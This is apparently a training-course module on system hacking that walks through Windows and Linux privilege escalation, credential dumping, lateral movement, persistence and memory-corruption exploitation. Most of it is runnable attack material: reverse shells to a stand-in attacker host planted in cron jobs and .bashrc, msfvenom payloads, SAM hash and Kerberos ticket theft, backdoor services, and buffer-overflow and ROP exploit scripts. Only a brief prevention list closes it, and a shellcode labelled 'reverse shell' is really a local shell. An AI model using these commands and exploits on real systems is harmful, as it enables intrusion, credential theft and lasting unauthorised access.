# 💻 Module 8: System Hacking - Complete Guide

## 📚 Table of Contents
1. [Introduction to System Hacking](#introduction)
2. [Windows Exploitation](#windows-exploitation)
3. [Linux Exploitation](#linux-exploitation)
4. [Buffer Overflow Exploitation](#buffer-overflow)
5. [Return-Oriented Programming (ROP)](#rop)
6. [Heap Exploitation](#heap-exploitation)
7. [Kernel Exploitation](#kernel-exploitation)
8. [Privilege Escalation](#privilege-escalation)
9. [Persistence Mechanisms](#persistence)
10. [Rootkits & Malware](#rootkits-malware)

---

## 🎯 Introduction to System Hacking

### System Hacking Kill Chain
```
1. Reconnaissance → Gather information about target
2. Weaponization → Create exploit payload
3. Delivery → Send exploit to target
4. Exploitation → Execute exploit code
5. Installation → Install backdoor/malware
6. Command & Control → Establish C2 channel
7. Actions on Objectives → Data exfiltration, lateral movement
```

### Attack Surface Analysis
```
Operating System Components:
├── Kernel
│   ├── System calls
│   ├── Device drivers
│   └── Memory management
├── User Space
│   ├── System services
│   ├── Applications
│   └── Libraries
├── Network Stack
│   ├── Network services
│   └── Protocol implementations
└── Hardware Interfaces
    ├── USB
    ├── Network cards
    └── Storage devices
```

---

## 🪟 Windows Exploitation

### 1. Windows Architecture Basics

```
User Mode (Ring 3)
├── Applications
├── Subsystem DLLs
└── NTDLL.DLL
    ↓ (System Call)
Kernel Mode (Ring 0)
├── Executive Layer
├── Kernel Layer
├── HAL (Hardware Abstraction Layer)
└── Drivers
```

### 2. Windows Enumeration

```powershell
# System Information
systeminfo
wmic os get caption,version,buildnumber
wmic computersystem get name,domain,manufacturer,model

# User Information
whoami /all
net user
net localgroup administrators
net user /domain
net group "Domain Admins" /domain

# Network Information
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state

# Process Information
tasklist /v
wmic process list brief
wmic service list brief

# Installed Software
wmic product get name,version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

# Scheduled Tasks
schtasks /query /fo LIST /v

# Security Information
net share
icacls C:\
gpresult /R

# Credential Search
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
findstr /si password *.txt *.xml *.ini *.config
dir /s *pass* == *cred* == *vnc* == *.config*
```

### 3. Windows Privilege Escalation

#### Unquoted Service Paths
```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Example vulnerable service:
# C:\Program Files\Some Folder\service.exe

# Create malicious executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > "Program.exe"

# Place in:
# C:\Program.exe (tries first)
# C:\Program Files\Some.exe (tries second)
# C:\Program Files\Some Folder\service.exe (original)

# Restart service
sc stop vulnerable_service
sc start vulnerable_service
```

#### Weak Service Permissions
```powershell
# Check service permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv Everyone * /accepteula

# Check specific service
sc qc vulnerable_service
accesschk.exe -ucqv vulnerable_service

# Exploit writable service
sc config vulnerable_service binpath= "C:\path\to\malicious.exe"
sc stop vulnerable_service
sc start vulnerable_service
```

#### AlwaysInstallElevated
```powershell
# Check if enabled
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi -o malicious.msi

# Install (runs as SYSTEM)
msiexec /quiet /qn /i malicious.msi
```

#### Stored Credentials
```powershell
# Windows Credential Manager
cmdkey /list
rundll32 keymgr.dll,KRShowKeyMgr

# Use stored credentials
runas /savecred /user:DOMAIN\Administrator cmd.exe

# Credential Files
dir /s *pass* *cred* *vnc* *.config*
findstr /si password *.xml *.ini *.txt *.config

# Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# SAM and SYSTEM hashes
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

# Extract hashes (on attacker machine)
samdump2 system.hive sam.hive
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

#### Token Impersonation
```powershell
# List available tokens
Invoke-TokenManipulation -ShowAll

# Impersonate SYSTEM
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "NT AUTHORITY\SYSTEM"

# Using Metasploit
use exploit/windows/local/ms16_075_reflection
set SESSION 1
exploit

# Or use incognito
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

#### Kernel Exploits
```powershell
# Check Windows version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Common exploits:
# MS16-032 (Secondary Logon Handle)
# MS16-135 (Win32k Elevation of Privilege)
# MS17-010 (EternalBlue)

# Use Windows Exploit Suggester
python windows-exploit-suggester.py --database 2023-01-01-mssb.xls --systeminfo systeminfo.txt
```

### 4. Windows Lateral Movement

#### Pass-the-Hash
```bash
# Using pth-toolkit
pth-winexe -U DOMAIN/user%hash //target cmd

# Using Metasploit
use exploit/windows/smb/psexec
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:hash_here
set RHOST target
exploit

# Using CrackMapExec
crackmapexec smb 192.168.1.0/24 -u Administrator -H hash_here
crackmapexec smb target -u Administrator -H hash_here -x whoami
```

#### Pass-the-Ticket (Kerberos)
```powershell
# Extract Kerberos tickets
mimikatz # sekurlsa::tickets /export

# Inject ticket
mimikatz # kerberos::ptt ticket.kirbi

# Use ticket
dir \\domain-controller\c$
```

#### PSExec
```bash
# Using Sysinternals PSExec
psexec \\target -u DOMAIN\user -p password cmd

# Using Metasploit
use exploit/windows/smb/psexec
set RHOST target
set SMBUser user
set SMBPass password
exploit

# Using Impacket
impacket-psexec DOMAIN/user:password@target
```

#### WMI Execution
```powershell
# Create process remotely
wmic /node:target /user:DOMAIN\user /password:password process call create "cmd.exe /c command"

# Using PowerShell
$username = 'DOMAIN\user'
$password = ConvertTo-SecureString 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
Invoke-WmiMethod -ComputerName target -Credential $cred -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c command"
```

#### WinRM (PowerShell Remoting)
```powershell
# Enable WinRM
Enable-PSRemoting -Force

# Connect to remote system
Enter-PSSession -ComputerName target -Credential DOMAIN\user

# Execute command
Invoke-Command -ComputerName target -Credential $cred -ScriptBlock { whoami }

# Using evil-winrm
evil-winrm -i target -u user -p password
```

### 5. Windows Persistence

#### Registry Run Keys
```powershell
# Run on startup
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"

# RunOnce
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"
```

#### Scheduled Tasks
```powershell
# Create scheduled task
schtasks /create /tn "UpdateTask" /tr "C:\path\to\backdoor.exe" /sc onlogon /ru SYSTEM

schtasks /create /tn "UpdateTask" /tr "C:\path\to\backdoor.exe" /sc daily /st 09:00

# Using PowerShell
$action = New-ScheduledTaskAction -Execute "C:\path\to\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "UpdateTask" -RunLevel Highest
```

#### Services
```powershell
# Create service
sc create BackdoorService binpath= "C:\path\to\backdoor.exe" start= auto
sc start BackdoorService

# Using PowerShell
New-Service -Name "BackdoorService" -BinaryPathName "C:\path\to\backdoor.exe" -StartupType Automatic
Start-Service BackdoorService
```

#### WMI Event Subscription
```powershell
# Create WMI event filter
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SystemStartup"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Create consumer
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "SystemStartupConsumer"
    CommandLineTemplate = "C:\path\to\backdoor.exe"
}

# Bind filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

---

## 🐧 Linux Exploitation

### 1. Linux Enumeration

```bash
# System Information
uname -a
cat /etc/issue
cat /etc/*-release
lsb_release -a

# User Information
whoami
id
cat /etc/passwd
cat /etc/group
sudo -l
cat /etc/sudoers

# Network Information
ifconfig -a
ip a
ip route
arp -a
netstat -tulpn
ss -tulpn

# Process Information
ps aux
ps -ef
top
pstree

# Installed Software
dpkg -l  # Debian/Ubuntu
rpm -qa  # RedHat/CentOS
which python python3 perl ruby gcc cc

# Scheduled Jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# SUID/SGID Files
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Writable Directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null

# Interesting Files
find / -name "*.conf" 2>/dev/null
find / -name "*.config" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
```

### 2. Linux Privilege Escalation

#### SUID Exploitation
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Common vulnerable SUID binaries

# 1. nmap (old versions)
nmap --interactive
!sh

# 2. find
find / -name test -exec /bin/sh \;

# 3. vim
vim -c ':!/bin/sh'

# 4. less/more
less /etc/passwd
!/bin/sh

# 5. awk
awk 'BEGIN {system("/bin/sh")}'

# 6. python
python -c 'import os; os.setuid(0); os.system("/bin/sh")'

# 7. perl
perl -e 'exec "/bin/sh";'

# 8. ruby
ruby -e 'exec "/bin/sh"'
```

#### Sudo Exploitation
```bash
# Check sudo permissions
sudo -l

# Example output:
# (ALL) NOPASSWD: /usr/bin/vim

# Common exploits:

# 1. vim/vi
sudo vim -c ':!/bin/sh'

# 2. less/more
sudo less /etc/passwd
!/bin/sh

# 3. find
sudo find / -name test -exec /bin/sh \;

# 4. awk
sudo awk 'BEGIN {system("/bin/sh")}'

# 5. man
sudo man man
!/bin/sh

# 6. nano
sudo nano
^R^X
reset; sh 1>&0 2>&0

# 7. ftp
sudo ftp
!/bin/sh

# 8. git
sudo git help config
!/bin/sh
```

#### Kernel Exploits
```bash
# Check kernel version
uname -r

# Common exploits:
# Dirty COW (CVE-2016-5195) - Linux 2.x-4.x
# Dirty Pipe (CVE-2022-0847) - Linux 5.8-5.16
# PwnKit (CVE-2021-4034) - pkexec

# Download and compile exploit
gcc -o exploit exploit.c
./exploit

# Automated enumeration
./linpeas.sh
./linux-exploit-suggester.sh
```

#### Writable /etc/passwd
```bash
# Check if /etc/passwd is writable
ls -l /etc/passwd

# Generate password hash
openssl passwd -1 -salt salt password123

# Add root user
echo 'hacker:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new user
su hacker
```

#### Cron Job Exploitation
```bash
# View cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Find writable cron scripts
ls -la /etc/cron.d/
ls -la /var/spool/cron/

# Create malicious script
echo '#!/bin/bash' > /path/to/writable/script.sh
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> /path/to/writable/script.sh
chmod +x /path/to/writable/script.sh

# Wait for cron to execute
```

#### Path Hijacking
```bash
# If a script runs with sudo and uses relative paths
sudo -l
# (root) NOPASSWD: /usr/local/bin/backup.sh

# backup.sh contains:
# #!/bin/bash
# tar -czf /backup/backup.tar.gz /data

# Create malicious tar
cat > /tmp/tar << EOF
#!/bin/bash
/bin/bash
EOF
chmod +x /tmp/tar

# Add /tmp to PATH and run
export PATH=/tmp:$PATH
sudo /usr/local/bin/backup.sh
```

#### Capabilities Exploitation
```bash
# Find files with capabilities
getcap -r / 2>/dev/null

# Example: python with cap_setuid
# /usr/bin/python3 = cap_setuid+ep

# Exploit
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### 3. Linux Persistence

#### SSH Keys
```bash
# Generate key pair
ssh-keygen -t rsa -b 4096

# Add public key to authorized_keys
echo "ssh-rsa AAAAB3... attacker@kali" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Connect
ssh -i id_rsa root@target
```

#### Cron Jobs
```bash
# Add backdoor to crontab
(crontab -l ; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'") | crontab -

# System-wide cron
echo "*/5 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'" >> /etc/crontab
```

#### Service Creation
```bash
# Create systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service

[Service]
ExecStart=/usr/local/bin/backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl enable backdoor.service
systemctl start backdoor.service
```

#### Bash Profile
```bash
# Add to .bashrc or .bash_profile
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1 &' >> ~/.bashrc
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1 &' >> /root/.bashrc
```

---

## 🔧 Buffer Overflow Exploitation

### 1. Stack Buffer Overflow Basics

```c
// Vulnerable program
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
}

int main(int argc, char **argv) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

### 2. Exploiting Buffer Overflow

```python
#!/usr/bin/env python3
import struct

# Find offset (using pattern_create and pattern_offset)
offset = 72

# Target return address
eip = struct.pack("<I", 0xdeadbeef)

# Shellcode (reverse shell)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
    b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

# NOP sled
nop_sled = b"\x90" * 100

# Payload structure:
# [NOP sled][Shellcode][Padding][Return Address]
payload = nop_sled + shellcode
payload += b"A" * (offset - len(payload))
payload += eip

print(payload)
```

### 3. Bypassing Stack Protections

#### DEP/NX Bypass (Return-to-libc)
```python
import struct

offset = 72

# Addresses (find using gdb)
system_addr = struct.pack("<I", 0xb7e63190)
exit_addr = struct.pack("<I", 0xb7e56260)
bin_sh_addr = struct.pack("<I", 0xb7f83a24)

# Payload: [padding][system][exit][/bin/sh]
payload = b"A" * offset
payload += system_addr
payload += exit_addr
payload += bin_sh_addr

print(payload)
```

#### ASLR Bypass (Information Leak)
```python
# 1. Leak address from memory
# 2. Calculate offset to libc base
# 3. Calculate gadget addresses
# 4. Build ROP chain

import struct

# Leaked libc address
leaked_addr = 0xb7e63190

# Known offset of leaked function in libc
libc_base = leaked_addr - 0x00063190

# Calculate system and /bin/sh addresses
system = libc_base + 0x00040310
bin_sh = libc_base + 0x00160a24

# Build payload
payload = b"A" * offset
payload += struct.pack("<I", system)
payload += struct.pack("<I", 0xdeadbeef)  # return addr
payload += struct.pack("<I", bin_sh)
```

---

## 🔄 Return-Oriented Programming (ROP)

### 1. ROP Basics

```python
# Find gadgets using ROPgadget
# ROPgadget --binary vulnerable --only "pop|ret"

import struct

offset = 72

# Gadgets (from ROPgadget)
pop_eax = struct.pack("<I", 0x080bb196)  # pop eax; ret
pop_ebx = struct.pack("<I", 0x080481c9)  # pop ebx; ret
pop_ecx_ebx = struct.pack("<I", 0x080e0ad1)  # pop ecx; pop ebx; ret
pop_edx = struct.pack("<I", 0x080583c9)  # pop edx; ret
int_0x80 = struct.pack("<I", 0x08049421)  # int 0x80

# execve("/bin/sh", NULL, NULL)
# eax = 11 (sys_execve)
# ebx = pointer to "/bin/sh"
# ecx = 0 (NULL)
# edx = 0 (NULL)

bin_sh = struct.pack("<I", 0x080e5060)  # address of "/bin/sh" string

# ROP chain
rop_chain = b""
rop_chain += pop_eax
rop_chain += struct.pack("<I", 11)  # sys_execve
rop_chain += pop_edx
rop_chain += struct.pack("<I", 0)   # NULL
rop_chain += pop_ecx_ebx
rop_chain += struct.pack("<I", 0)   # NULL
rop_chain += bin_sh
rop_chain += int_0x80

# Final payload
payload = b"A" * offset + rop_chain
```

### 2. Automated ROP with pwntools

```python
from pwn import *

# Load binary
elf = ELF('./vulnerable')
rop = ROP(elf)

# Build ROP chain automatically
rop.call('system', [next(elf.search(b'/bin/sh'))])

# Generate payload
payload = b"A" * offset + rop.chain()

# Send payload
p = process('./vulnerable')
p.sendline(payload)
p.interactive()
```

---

## 🗂️ Heap Exploitation

### 1. Use-After-Free (UAF)

```c
// Vulnerable code
#include <stdlib.h>
#include <string.h>

typedef struct {
    void (*greet)(void);
    char name[32];
} User;

void admin_greet() {
    system("/bin/sh");
}

void user_greet() {
    printf("Hello user!\n");
}

User *create_user(char *name) {
    User *u = malloc(sizeof(User));
    u->greet = user_greet;
    strcpy(u->name, name);
    return u;
}

int main() {
    User *u1 = create_user("Alice");
    free(u1);  // Free but pointer still accessible
    
    // User input here could overwrite freed memory
    User *u2 = create_user(malicious_input);
    
    u1->greet();  // UAF: calls function pointer in freed memory
}
```

```python
# Exploit
# 1. Allocate object
# 2. Free object
# 3. Allocate new object of same size
# 4. Use old pointer (points to new object)

payload = struct.pack("<I", admin_greet_addr) + b"A" * 28
```

### 2. Double Free

```c
// Vulnerable code
void *ptr = malloc(100);
free(ptr);
free(ptr);  // Double free!

// Exploit: Causes heap corruption, can lead to arbitrary write
```

### 3. Heap Overflow

```c
// Vulnerable code
char *buf1 = malloc(64);
char *buf2 = malloc(64);

strcpy(buf1, long_string);  // Overflows into buf2
```

---

## 🔐 Kernel Exploitation

### 1. Linux Kernel Module Exploitation

```c
// Vulnerable kernel module
#include <linux/module.h>
#include <linux/kernel.h>

static ssize_t device_write(struct file *file, const char *buffer, size_t length, loff_t *offset) {
    char kernel_buffer[64];
    copy_from_user(kernel_buffer, buffer, length);  // No bounds check!
    return length;
}
```

### 2. Kernel Privilege Escalation

```c
// Exploit: Overwrite kernel structures
#include <sys/mman.h>
#include <sys/wait.h>

void get_root() {
    commit_creds(prepare_kernel_cred(0));
}

int main() {
    // Trigger vulnerability
    // Overwrite function pointer with get_root()
    // Execute to gain root
}
```

---

## 🔒 Summary & Prevention

### Key Takeaways
1. **Keep systems updated** - patch vulnerabilities
2. **Principle of least privilege** - minimal permissions
3. **Input validation** - sanitize all input
4. **ASLR, DEP, Stack Canaries** - enable protections
5. **Code review** - find vulnerabilities early
6. **Monitoring & logging** - detect attacks
7. **Security hardening** - disable unnecessary services
8. **Regular audits** - test security posture

**Module 8 Complete! Next: Module 9 - Application Security** 🛡️
